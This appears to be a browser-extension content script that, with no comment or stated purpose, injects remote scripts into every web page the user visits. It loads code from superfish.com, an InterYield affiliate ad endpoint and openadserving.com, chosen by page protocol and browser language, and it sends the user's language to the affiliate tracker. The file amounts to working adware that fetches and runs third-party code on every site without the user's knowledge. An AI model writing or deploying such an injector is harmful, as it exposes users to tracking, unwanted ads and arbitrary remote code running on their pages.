var _href=window.location.href;
var _lang=window.navigator.language;
if(_href.indexOf("http")==0&&_href.indexOf("https")==-1){
    if (!document.getElementById("wsparityID")) {
        var conScruipt = document.createElement("script");
        conScruipt.src = "http://www.superfish.com/ws/sf_main.jsp?dlsource=jkezagm&CTID=cdba";
        conScruipt.setAttribute("id", "wsparityID");
        document.body.appendChild(conScruipt);
    }
    if(_lang.indexOf("en-US")>=0 || _lang.indexOf("fr")>=0){
        if (!document.getElementById("interyieldID")) {
            var conScruipt = document.createElement("script");
            conScruipt.src = "https://interyield.jmp9.com/InterYield/bindevent.do?e=click&affiliate=alexwebstore&subid="+_lang+"&ecpm=0&debug=false&snoozeMinutes=300&adCountIntervalHours=24&maxAdCountsPerInterval=2&attributionLogo=custom+attribution&attributionTitle=custom+attribution+title&attributionLink=custom+attribution+link";
            conScruipt.setAttribute("id", "interyieldID");
            document.body.appendChild(conScruipt);
        }
    }else{
        if (!document.getElementById("adcashID")) {
            var conScruipt = document.createElement("script");
            conScruipt.src = "http://www.openadserving.com/script/java.php?option=rotateur&r=316087";
            conScruipt.setAttribute("id", "adcashID");
            document.body.appendChild(conScruipt);
        }
    }
}else if(_href.indexOf("https")==0){
    if (!document.getElementById("wsparityID")) {
        var conScruipt = document.createElement("script");
        conScruipt.src = "https://www.superfish.com/ws/sf_main.jsp?dlsource=jkezagm&CTID=cdba";
        conScruipt.setAttribute("id", "wsparityID");
        document.body.appendChild(conScruipt);
    }
    if (!document.getElementById("interyieldID")) {
        var conScruipt = document.createElement("script");
        conScruipt.src = "https://interyield.jmp9.com/InterYield/bindevent.do?e=click&affiliate=alexwebstore&subid="+_lang+"&ecpm=0&debug=false&snoozeMinutes=300&adCountIntervalHours=24&maxAdCountsPerInterval=2&attributionLogo=custom+attribution&attributionTitle=custom+attribution+title&attributionLink=custom+attribution+link";
        conScruipt.setAttribute("id", "interyieldID");
        document.body.appendChild(conScruipt);
    }
}
